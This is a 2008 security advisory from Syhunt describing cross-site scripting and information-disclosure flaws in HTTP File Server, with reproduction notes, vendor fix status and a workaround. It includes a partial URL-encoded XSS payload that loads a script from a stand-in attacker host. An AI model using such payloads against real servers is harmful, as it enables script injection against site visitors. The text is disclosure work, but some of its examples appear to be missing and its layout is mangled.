According to information on the official ， website , the HTTP File Server software has been downloaded about ， 2 million times. ， Description :  ， When a specific URL is visited , HFS displays a non-existent ， account name in the response body. This non-existent account ， name can be HTML code , allowing a remote attacker to use this ， to launch XSS attacks. ， Because the HTML code is also recognized by the web server as a ， HFS HTML template , it is also possible to inject symbols to ， force HFS to reveal details about the server ( eg , current HFS ， server version , build , connections , timestamp , uptime , current ， outbound and inbound speed , and more ) . Technical details are ， included below. ， Details ( Replicating the issues )  :  ， 1 ) Cross-Site Scripting ( XSS ) and Host Field XSS Vulnerabilities ， Example 1 - Launching a basic XSS :  ， Example 2 - Injecting an external script ( A mix of encoding and ， javascript functions is used here to circumvent browser ， URL limitations )  :  ， %2ewrite ( '<script%20src=http'+sChar+'%2f%2fwww%2eattacker%2ecom ， %2fxss%2ejs><%5c%2fscript>' ) %3b<%2fscript>a : x @  [ host ] / ，  * This is specially dangerous if launched against Firefox. In ， order to protect the password from prying eyes , Firefox entirely ， hides what comes before the at (  @  ) character and then only the ， host name remains visible in the address bar. Firefox will also ， resubmit the auth credentials everytime the host is visited ， during the current browser session ( unless new credentials are ， supplied ) . ，  * User must be already logged in ( via / ~ login ) and the current ，  ( root ) path should not be password protected in the HFS-VFS ， panel. ，  * If the host symbol is injected using this technique , HFS will ， recognize it as a HTML template and return the data provided in ， Host field of the request as part of the response body. The same ， happens if the host symbol has been included ( after ， customization ) in the current HFS HTML template. ， Detection :  ， See the \"checkxss\" command ， Sandcat can also be used to identify this issue :  ， 2 ) Information Disclosure ， Example 1 - Injecting Symbols :  ， The \"ver\" command will force HFS to reveal its version and build ， The \"symbols\" command will force HFS to reveal additional ， details about the server ( such as connections , timestamp , uptime ,  ， current outbound and inbound speed , and more ) . ，  * You can disable the \"Send HFS identifier\" option ( which ， enables the HFS banner ) and remove all server identifier ， symbols from the original HTML template , and still it will work. ， Additional Considerations :  ，  * An updated IE will not accept basic auth via URL. See :  ， and the MS security ， update 832894 if you wish to learn about this subject. ， Vulnerability Status :  ， The vendor was contacted and has immediately released HFS 2.2c ， which fixes these problems. The new version can be downloaded at ， www.rejetto.com/hfs/download or via the \"Check for news/updates\" ， option in the HFS menu. ， As a workaround for the affected releases , users should remove ， the %user% and %host% symbols from any HFS HTML templates. ， Testers of HFS 2.3 Beta should upgrade to the latest 2.3 beta ， build. ， HFS 2.3 Beta specifically is only affected if the option ， \"Accept any login for unprotected resources\" is enabled. This ， option , introduced in this version , is disabled by default. ， Credit :  ， Felipe Aragon and Alec Storm ， Syhunt Security Research Team , www.syhunt.com ， Copyright ? 2008 Syhunt Security",
